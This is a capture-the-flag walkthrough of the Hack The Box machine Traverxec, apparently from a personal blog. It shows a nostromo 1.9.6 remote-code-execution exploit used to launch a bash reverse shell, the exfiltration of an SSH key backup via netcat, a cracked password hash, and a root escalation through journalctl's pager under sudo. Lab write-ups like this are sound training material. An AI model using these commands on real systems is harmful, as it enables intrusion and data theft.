---
featured_image: "/posts/Traverxec/traverxec.png"
title : HTB 18/20 Traverxec
published : true
date: 2021-04-27
author : PS
---
## Foothold
*nmap*
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 11:04 EEST
Nmap scan report for 10.10.10.165
Host is up (0.090s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.15 seconds
```
Port 80 :
![img](1.png)
Running nikto on the target reveals something interesting :  
```bash
>>> nikto -h 10.10.10.165
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.165
+ Target Hostname:    10.10.10.165
+ Target Port:        80
+ Start Time:         2021-04-29 11:12:41 (GMT3)
---------------------------------------------------------------------------
+ Server: nostromo 1.9.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
```
*+ Server: nostromo 1.9.6*
Hmmm
![img](2.png)
```bash
>>> python2 exploit.py 10.10.10.165 80 whoami


                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Thu, 29 Apr 2021 08:16:18 GMT
Server: nostromo 1.9.6
Connection: close


www-data
>>> python2 exploit.py 10.10.10.165 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.7/6969 0>&1"'

```
And we got a shell  
## User
After running linenum PS found .htpasswd
Which had a password inside it
```bash
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/  
```
Now after we crack it we get Nowonly4me  
Unfortunately that was not the ssh password :((  
Another interesting find is the /home dir , on web apps home dir are defined by ~
So :  
![img](3.png)
Now I tried many things there , nothing really worked , until I saw that index.html on the web page returning 200 , that means that the public_www is readable :D  
```bash
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls
ls
index.html
protected-file-area
www-data@traverxec:/home/david/public_www$ 
```
Use nc to get the files on your pc : 
```bash
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | nc 10.10.14.7 6666
>>> nc -nlvp 6666 > backup.tgz
```
![img](4.png)
Crack the password wiith ssh2john
Then login with david
```bash
david@traverxec:~$ whoami
david
david@traverxec:~$ 
```
## Root
```bash
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ cat user.txt
7db0b48469606a42cec20750d9782f3d
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.
cat: server-stats.: No such file or directory
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
david@traverxec:~/bin$ 
```
So we need to exploit journalctrl   
https://gtfobins.github.io/gtfobins/journalctl/
```bash
david@traverxec:~/bin$ sudo journalctl
[sudo] password for david: 
^Csudo: 1 incorrect password attempt
david@traverxec:~/bin$ ^C
```
wants the sudo password, so we need to work around that :  
```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
Then type less then !/bin/bash does the trick
```
```bash
!/bin/bash
root@traverxec:/home/david/bin# whoami
root
root@traverxec:/home/david/bin# cd /root
root@traverxec:~# cat root.txt
9aa36a6d76f785dfd320a478f6e0d906
root@traverxec:~# 
```

